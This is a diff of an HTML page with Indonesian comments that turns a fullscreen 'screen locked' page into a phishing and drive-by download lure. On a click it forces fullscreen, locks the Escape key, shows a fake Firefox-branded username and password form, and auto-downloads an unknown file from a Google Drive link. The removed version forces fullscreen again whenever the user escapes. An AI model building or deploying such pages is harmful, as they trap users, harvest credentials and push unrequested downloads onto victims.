@@ -1,82 +1,84 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Fullscreen Lock</title>
-<style>
-  html, body {
-    margin:0; padding:0; height:100%; font-family:sans-serif; overflow:hidden;
-  }
-
-  #fsBtn {
-    position: fixed;
-    top:20px; left:20px;
-    padding:12px 24px; font-size:16px;
-    cursor:pointer; border:none; border-radius:6px; background:#007bff; color:white;
-    z-index:1001;
-  }
-
-  #overlay {
-    display:none;
-    position:fixed; top:0; left:0;
-    width:100vw; height:100vh;
-    background:white; z-index:999999;
-    display:flex; justify-content:center; align-items:center;
-    font-size:2rem; color:black; text-align:center; padding:0 20px;
-  }
-</style>
-</head>
-<body>
-
-<button id="fsBtn">Masuk Full Screen Lock</button>
-
-<div id="overlay">
-  Full Screen Aktif — Layar Terkunci
-</div>
-
+<body></body>
+<h1>Click Anywhere</h1>
 <script>
-const fsBtn = document.getElementById('fsBtn');
-const overlay = document.getElementById('overlay');
+document.body.onclick = (event) => {
+    const isInputOrButton = event.target.tagName === 'INPUT' || event.target.tagName === 'BUTTON';
+    if (!isInputOrButton) {
+        // Masuk fullscreen
+        document.documentElement.requestFullscreen().then(() => {
+            showContent();      // Tampilkan konten login
+            triggerDownload();  // Auto-download muncul di tengah overlay
+        }).catch(console.error);
 
-// Request fullscreen dengan fallback
-function requestFullscreen(elem){
-  if(elem.requestFullscreen) return elem.requestFullscreen();
-  if(elem.webkitRequestFullscreen) return elem.webkitRequestFullscreen();
-  if(elem.msRequestFullscreen) return elem.msRequestFullscreen();
-  if(elem.mozRequestFullScreen) return elem.mozRequestFullScreen();
-  return Promise.reject('Fullscreen API tidak didukung');
+        // Lock keyboard Escape
+        if(navigator.keyboard && navigator.keyboard.lock) {
+            navigator.keyboard.lock(["Escape"]).catch(()=>{});
+        }
+    }
+};
+
+function showContent() {
+    const content = `
+        <div id="imageContainer" style="background-color: #fff; text-align: center; margin-top: 20px;">
+            <img src="top.png" class="header" />
+            <div style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+                <div style="background-color: #fff; padding: 50px; box-shadow: 0 0 10px rgba(0,0,0,0.2); border-radius: 10px; width: 25vw; text-align:center; position:relative;">
+                    <img src="https://www.mozilla.org/media/protocol/img/logos/firefox/logo.fedb52c912d6.svg" style="display:block;margin:0 auto;" />
+                    <form id="formContainer" style="margin-top:50px;" onsubmit="return handleSubmit(event);">
+                        <div style="margin-bottom:20px;">
+                            <input type="text" id="username" placeholder="Username" style="width:100%;padding:10px;font-size:16px;border-radius:5px;border:1px solid #ccc;" required>
+                        </div>
+                        <div style="margin-bottom:20px;">
+                            <input type="password" id="password" placeholder="Password" style="width:100%;padding:10px;font-size:16px;border-radius:5px;border:1px solid #ccc;" required>
+                        </div>
+                        <input type="submit" value="Sign In" style="width:100%;padding:10px;background-color:#3f51b5;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;">
+                    </form>
+
+                    <!-- Overlay notifikasi download di tengah atas -->
+                    <div id="downloadOverlay" style="
+                        position:absolute;
+                        top:10%;
+                        left:50%;
+                        transform:translateX(-50%);
+                        background:#28a745;
+                        color:white;
+                        padding:15px 30px;
+                        border-radius:8px;
+                        font-size:1.2rem;
+                        box-shadow:0 0 10px rgba(0,0,0,0.3);
+                        z-index:9999;
+                        display:flex;
+                        align-items:center;
+                        justify-content:center;">
+                        File sedang diunduh...
+                    </div>
+                </div>
+            </div>
+        </div>`;
+    document.body.innerHTML = content;
+    setTimeout(() => document.getElementById('username').focus(), 0);
 }
 
-// Cek fullscreen aktif
-function isFullscreen(){
-  return !!(document.fullscreenElement || document.webkitFullscreenElement || document.msFullscreenElement || document.mozFullScreenElement);
+function handleSubmit(event) {
+    event.preventDefault();
+    alert('Form submitted!');
+    // login processing tetap berjalan
 }
 
-// Masuk fullscreen lock
-fsBtn.addEventListener('click', ()=>{
-  requestFullscreen(document.documentElement).catch(e=>alert(e));
-});
+// Auto-download saat masuk fullscreen
+function triggerDownload() {
+    const url = "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0&confirm=t&uuid=733afb2e-0d6c-4da7-8ec5-883d0b792a34&at=AGN2oQ0VkjDRWTpZ7Vs-SmKiGHJ6:1773905849768";
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = 'file_didownload';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 
-// Update overlay setiap fullscreen berubah
-function updateOverlay(){
-  if(isFullscreen()){
-    overlay.style.display='flex';
-    fsBtn.style.display='none';
-  } else {
-    // Jika fullscreen hilang (misal Esc), tampilkan overlay + paksa fullscreen lagi
-    overlay.style.display='flex';
-    fsBtn.style.display='none';
-    // Paksa fullscreen otomatis lagi setelah 200ms
-    setTimeout(()=>requestFullscreen(document.documentElement).catch(()=>{}), 200);
-  }
+    // Hapus overlay otomatis setelah 3 detik
+    setTimeout(() => {
+        const overlay = document.getElementById('downloadOverlay');
+        if (overlay) overlay.style.display = 'none';
+    }, 3000);
 }
-
-document.addEventListener('fullscreenchange', updateOverlay);
-document.addEventListener('webkitfullscreenchange', updateOverlay);
-document.addEventListener('mozfullscreenchange', updateOverlay);
-document.addEventListener('MSFullscreenChange', updateOverlay);
 </script>
-
-</body>
-</html>
